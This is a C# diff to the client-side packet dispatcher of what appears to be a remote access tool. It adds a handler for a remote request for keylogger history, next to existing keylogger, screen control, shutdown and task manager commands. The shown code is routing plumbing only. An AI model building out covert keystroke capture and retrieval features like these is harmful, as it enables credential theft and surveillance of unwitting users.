@@ -16,6 +16,7 @@ namespace Client.Networking
         private readonly Action<KeyLoggerStart>? _onKeyLoggerStart;
         private readonly Action<KeyLoggerStop>? _onKeyLoggerStop;
         private readonly Action<KeyLoggerLangToggle>? _onKeyLoggerLangToggle;
+        private readonly Action<KeyLoggerHistoryRequest>? _onKeyLoggerHistoryRequest;
         private readonly Action<MessageBoxRequest> _onMessageBoxRequest;
         private readonly Action<ShutdownActionRequest> _onShutdownActionRequest;
         private readonly Action<ScreenControlStart>? _onScreenControlStart;
@@ -31,6 +32,7 @@ namespace Client.Networking
                              Action<KeyLoggerStart>? onKeyLoggerStart = null, 
                              Action<KeyLoggerStop>? onKeyLoggerStop = null, 
                              Action<KeyLoggerLangToggle>? onKeyLoggerLangToggle = null, 
+                             Action<KeyLoggerHistoryRequest>? onKeyLoggerHistoryRequest = null,
                              Action<TaskManagerRequest>? onTaskManagerRequest = null,
                              Action<ScreenControlStart>? onScreenControlStart = null,
                              Action<ScreenControlStop>? onScreenControlStop = null,
@@ -44,6 +46,7 @@ namespace Client.Networking
             _onKeyLoggerStart = onKeyLoggerStart;
             _onKeyLoggerStop = onKeyLoggerStop;
             _onKeyLoggerLangToggle = onKeyLoggerLangToggle;
+            _onKeyLoggerHistoryRequest = onKeyLoggerHistoryRequest;
             _onMessageBoxRequest = onMessageBoxRequest;
             _onShutdownActionRequest = onShutdownActionRequest;
             _onScreenControlStart = onScreenControlStart;
@@ -113,6 +116,13 @@ namespace Client.Networking
                         if (klLang != null && _onKeyLoggerLangToggle != null)
                         {
                             _onKeyLoggerLangToggle(klLang);
+                        }
+                        break;
+                    case PacketType.KeyLoggerHistoryRequest:
+                        var klHistoryReq = JsonHelper.Deserialize<KeyLoggerHistoryRequest>(json);
+                        if (klHistoryReq != null && _onKeyLoggerHistoryRequest != null)
+                        {
+                            _onKeyLoggerHistoryRequest(klHistoryReq);
                         }
                         break;
                     case PacketType.MessageBoxRequest:
